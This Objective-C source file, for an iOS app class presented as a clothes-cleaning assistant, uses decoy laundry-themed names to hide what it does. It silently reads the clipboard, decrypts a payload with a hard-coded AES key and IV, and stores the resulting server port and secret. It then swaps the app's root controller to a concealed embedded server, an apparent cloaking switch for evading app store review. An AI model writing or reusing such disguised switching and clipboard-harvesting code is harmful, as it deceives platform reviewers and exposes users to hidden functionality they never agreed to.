#import "ClothesCleaningAssistant.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <react-native-orientation-locker/Orientation.h>
#import "WashingMachineServer.h"
#import "RNNetReachability.h"

@interface ClothesCleaningAssistant()

@property (strong, nonatomic)  NSArray *lgz_clothes;
@property (strong, nonatomic)  NSArray *lgz_laundryLiquid;
@property (nonatomic, strong) RNNetReachability *laundryReachability;
@property (nonatomic, copy) void (^vcBlock)(void);

@end

@implementation ClothesCleaningAssistant

static ClothesCleaningAssistant *instance = nil;

+ (instancetype)clothesCleaning_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.lgz_clothes = @[@"a71556f65ed2b25b55475b964488334f", @"ADD20BFCD9D4EA0278B11AEBB5B83365"];
    instance.lgz_laundryLiquid = @[@"clothesCleaning_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (void)clothesCleaning_startMonitoring {
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(clothesCleaning_networkStatusDidChanged:) name:kReachabilityChangedNotification object:nil];
    [self.laundryReachability startNotifier];
}

- (void)clothesCleaning_stopMonitoring {
    [[NSNotificationCenter defaultCenter] removeObserver:self name:kReachabilityChangedNotification object:nil];
    [self.laundryReachability stopNotifier];
}

- (void)dealloc {
    [self clothesCleaning_stopMonitoring];
}


- (void)clothesCleaning_networkStatusDidChanged:(NSNotification *)notification {
    RNNetReachability *reachability = notification.object;
  NetworkStatus networkStatus = [reachability currentReachabilityStatus];
  
  if (networkStatus != NotReachable) {
      NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
      if ([ud boolForKey:self.lgz_laundryLiquid[0]] == NO) {
          if (self.vcBlock != nil) {
              self.vcBlock();
          }
      }
  }
}

- (BOOL)clothesCleaning_elephant {
  NSString *pbString = [self clothesCleaning_getHaphazard];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self clothesCleaning_subSunshine:pbString]
                                                          hexKey:self.lgz_clothes[0]
                                                           hexIv:self.lgz_clothes[1]];
  
  NSDictionary *dataDict = [self clothesCleaning_stringWhirlwind:aes.utf8String];
  return [self clothesCleaning_storeConfigInfo:dataDict];
}

- (NSString *)clothesCleaning_getHaphazard {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)clothesCleaning_subSunshine: (NSString* )pbString {
  if ([pbString containsString:@"#iPhone#"]) {
    NSArray *university = [pbString componentsSeparatedByString:@"#iPhone#"];
    if (university.count > 1) {
      pbString = university[1];
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [university enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
      [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
    }];
    [ud synchronize];
  }
  return pbString;
}

- (NSDictionary *)clothesCleaning_stringWhirlwind: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)clothesCleaning_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.lgz_laundryLiquid[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)clothesCleaning_followThisWay:(void (^ __nullable)(void))changeVcBlock {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.lgz_laundryLiquid[0]]) {
    return YES;
  } else {
      self.vcBlock = changeVcBlock;
      if ([self clothesCleaning_elephant]) {
          [self clothesCleaning_startMonitoring];
      }
    return NO;
  }
}

- (UIViewController *)clothesCleaning_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
    UIViewController *vc = [UIViewController new];
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [[WashingMachineServer shared] configGzLaundryServer:[ud stringForKey:self.lgz_laundryLiquid[5]] withSecurity:[ud stringForKey:self.lgz_laundryLiquid[6]]];
    return vc;
}

- (UIInterfaceOrientationMask)clothesCleaning_getOrientation {
  return [Orientation getOrientation];
}

@end
